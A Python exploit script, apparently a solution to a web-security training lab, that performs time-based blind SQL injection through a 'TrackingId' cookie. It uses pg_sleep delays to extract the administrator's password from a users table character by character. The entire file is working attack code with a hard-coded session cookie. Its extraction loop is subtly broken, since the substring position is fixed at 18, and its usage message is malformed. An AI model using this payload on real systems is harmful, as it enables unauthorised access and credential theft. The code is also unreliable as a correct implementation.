import sys
import requests
import urllib3
import urllib.parse
import time

#
# Blind SQL injection with time delays and information retrieval
#

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {"http":"https://127.0.0.1:8080"} #,"https":"https://127.0.0.1:8080"}


def sqli_password(url):
    password_extracted=""
    for i in range(1,21):
        for j in range(32,126):

            sqli_payload = "' || (SELECT CASE WHEN (username='administrator' and ascii(substring(password,18,1))='%s') THEN pg_sleep(10) ELSE pg_sleep(-1) END from users)--" % (j)

            sqli_payload_encoded = urllib.parse.quote(sqli_payload)

            cookie = {'TrackingId' : 'B2Xf362JTn2Di1mv' + sqli_payload_encoded,
            'session':'bFfxCwHlZ7fy3lbjlapa6QExRZvYPt3E'}
            
            r= requests.get(url, cookies=cookie, verify=False,proxies=proxies, timeout=20)

            if r.elapsed.seconds > 9:
                password_extracted += chr(j)
                sys.stdout.write('\r'+password_extracted)
                sys.stdout.flush()
                
                break
            else:
                sys.stdout.write('\r'+password_extracted+chr(j))
                sys.stdout.flush()
def main():
    if len(sys.argv) != 2:
        print ("(+) Usage: %2 <url> " % sys.argv[0])

    url = sys.argv[1]
    print ("(+) Retrieving administrator password...")
    sqli_password(url)

if __name__ == "__main__":
    main()